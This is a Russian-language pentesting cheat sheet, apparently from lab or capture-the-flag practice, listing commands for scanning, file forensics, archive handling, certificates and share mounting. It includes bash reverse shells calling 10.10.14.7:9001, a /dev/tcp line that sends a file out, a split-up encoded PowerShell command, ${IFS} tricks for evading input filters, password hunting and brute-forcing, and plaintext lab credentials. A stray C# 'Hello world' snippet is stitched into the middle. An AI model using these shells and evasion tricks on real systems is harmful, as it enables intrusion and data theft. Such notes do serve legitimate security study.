# Анализ microsoft script fiels

https://github.com/decalage2/oletools.git

sudo -H pip install -U oletools

olevba Currency\ Volume\ Report.xlsm 

# БИНАРНЫЕ ФАЙЛЫ ПРОГРАМ

https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64


# SUCRACK

./sucrack -a -w 20 -s 10 -u max -r file

# Find
Поиск файлов со Suid
	find / -perm -4000 2>/dev/null | xargs ls -la

Поиск файлов входящих в группу
	find / -type f -group developers 2>/dev/null -ls

Поиск и передача в другую команду
 	find . -type f -ls

Поиск и передать на вход exiftool
	find . -type f -exec exiftool {} \\;

# Передача на вход другой  комманде

find . -type f -exec exiftool {} \\;

# NMAP
	
 	fping -ag 192.168.50.1/24 2>/dev/null
 --------------------------------
 	grep "Up" pingsweep.gnmap | cut -d " " -f2 > targets.txt
 --------------------------------
  	sudo nmap -Pn -n -sV -A -p 22,25,53,80,139,443,445,1433,3306,3389,5800,5900,8080,8443 -iL hosts/targets.txt -oA services/quick-sweep --min-rate 1240 --min-hostgroup 50
--------------------------------
	
--------------------------------
	sudo nmap -Pn -n -sV -A -iL hosts/targets.txt -p 0-65535 -oA services/full-sweep --min-rate 50000 --min-hostgroup 100


using System;

class Program
{
    static void Main()
    {
        Console.WriteLine("Привет, мир!");
    }
}

# GREP

Поиск и вырезание слов из файла

 	grep "Up" file.txt | cut -d " " -f2

 (разделитель - пробел 2-й абзац)

Поиск password в текущей директории

	grep -Ri password .  

Поиск симоволов длинной 32 бита от a-z и от 0-9

	grep -a '[a-z0-9]\{32\}' /dev/sdb
# AWK 

cat passwd | awk '{ print $1 }' > users
cat passwd | awk '{ print $3 }' > passwords

cat hash.txt | awk -F: {'print $1'}

# поиск процессов для lexi

ps -ef | grep lexi

# Размер директорий с содержимым Linux

du -hs *

# Извлекает файлы из файлов 

binwalk -e king   

binwalk --dd='.*' music.mp3

# Подсчет символов в стандартном вводе

grep qwerty | wc -c ---> 6

# Строки ASCII из файла

strings file

strings -n 8 backup.mdb > ../../dict.txt (отделить все что длиннее 8 символов)

# кодировка base64

	--- кодирование в бейз64 без разрыва строк и копироване в буферобмена
 
base64 -w0 Shell.dll | xclip -selection clipboard

base64 -d (file.txt или стандартный вывод)

    (обфускация команд)

echo "ping -n 1 10.10.14.4" | iconv -t UTF16LE | base64 -w 0

	var1="cm"
	var2="d /c"
	var3="powe"
	var4="rshell -enco"
	var5="dedcommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA0AAoA"
	

# перевод в 16 формат

cat password_backup | xxd > bak
 
 и обратно
 
cat password_backup | xxd -r > bak

# маленький броузер

curl -s http://10.10.10.150/secret.txt | base64 -d


# Архиваторы

7z x application.zip  

bzip2 -d bak

file bak.out

mv bak.out bak.gz

gzip -d bak.gz

file bak

bzip2 -d bak

file bak.out

tar -xvf bak.out (извлечение)

tar -tvf bak.out (просмотр)

# утилита шифрования openssl

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes  (рашифровывает формат pfx)  (извлечение ключей)

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem (извлечение сертификата windows)

# просмотр всех каталогов и файлов в том числе скрытых Windows

gci -force .

# Docker

dive docker-archive://image.tar


# Монтирование удаленной файловой системы к текущей файловой системе

    mkdir /mnt/data/
    sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/data/
    sudo mount -t cifs '//10.10.10.103/Department Shares' /mnt/sizzle

cifs - Common Internet File System

# Монтирование гостевой операционки с дика VHD

guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd

# Обратная оболочка bash

    bash -i >& /dev/tcp/10.10.14.7/9001 0>&1 

    bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'
    
    cat file > /dev/tcp/ip/port
    
# ПРослушивание через tcpdump и передача в wireshark

ssh 10.10.14.7@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -

(laba - light)

tcpdump -i tun0 -n icmp



# Обфускация пробелов 

echo “${IFS}test”

ip${IFS}a;

{echo,test}

echo "pind -c 1 10.10.10.10" | sed 's/  /${IFS}/g'   ---> установка вместо пробелов ${IFS}

# bash

--циклы
    for i in $(seq 0 9999); do
    echo $i;
    done
    
for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/Department Shares' $i;  done

--оболочка

bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'

# Создание сертификата ssl для active directory

--создаем ключ закрытый

openssl genrsa -aes256 -out amanda.key 2048

--создаем запрос на сертивфикат в центр сертификации для подписания

openssl req -new -key amanda.key -out amanda.csr

--просмотреть сертификат

openssl x509 -in amanda.cer -text

# Разбить файл на строки длинной 120 символов
	fold -w 120 icmp.ps1.b64 > tmp


 # Переделка Microsoft Outlook файла в читаемый формат

 readpst Access\ Control.pst
# Расшифровка пароля груповой политики виндовс

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ---> GPPstillStandingStrong2k18
